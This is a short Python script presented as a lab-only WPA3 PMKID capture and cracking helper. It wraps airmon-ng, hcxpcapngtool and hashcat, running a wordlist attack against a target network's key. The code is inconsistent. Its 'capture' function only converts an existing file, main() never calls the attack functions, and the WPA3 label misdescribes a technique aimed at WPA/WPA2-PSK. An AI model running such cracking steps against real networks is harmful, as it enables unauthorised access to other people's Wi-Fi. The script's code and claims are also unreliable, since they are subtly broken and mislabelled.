#!/usr/bin/env python3
# LAB-ONLY: Wi-Fi WPA3 PMKID Capture & Cracking Helper
# CEH v13 Ultimate Offensive Script 14
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import sys
import subprocess

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_WIRELESS_INTERFACE = "wlan0"
LAB_TARGET_BSSID = "AA:BB:CC:DD:EE:FF"
LAB_WORDLIST = "/usr/share/wordlists/rockyou.txt"
# -----------------------------------------------------------------------------------

def start_monitor():
    print(f"[*] Starting monitor mode on {LAB_WIRELESS_INTERFACE}...")
    try:
        subprocess.run(["airmon-ng", "start", LAB_WIRELESS_INTERFACE], check=True)
    except Exception as e:
        print(f"Error: {e}")

def capture_pmkid():
    print(f"[*] Capturing PMKID from {LAB_TARGET_BSSID}...")
    try:
        subprocess.run(["hcxpcapngtool", "-o", "lab-pmkid.22000", "lab-capture.pcapng"], check=True)
    except Exception as e:
        print(f"Error: {e}")

def crack_pmkid():
    print("[*] Cracking PMKID...")
    try:
        subprocess.run(["hashcat", "-m", "22000", "lab-pmkid.22000", LAB_WORDLIST], check=True)
    except Exception as e:
        print(f"Error: {e}")

def main():
    print("="*80)
    print("LAB-ONLY: WPA3 PMKID Capture & Cracking Helper")
    print("="*80)
    print("Steps (LAB ONLY):")
    print("1. Set interface to monitor mode")
    print("2. Capture PMKID with hcxdumptool")
    print("3. Convert capture to hashcat format")
    print("4. Crack with hashcat")

if __name__ == "__main__":
    main()
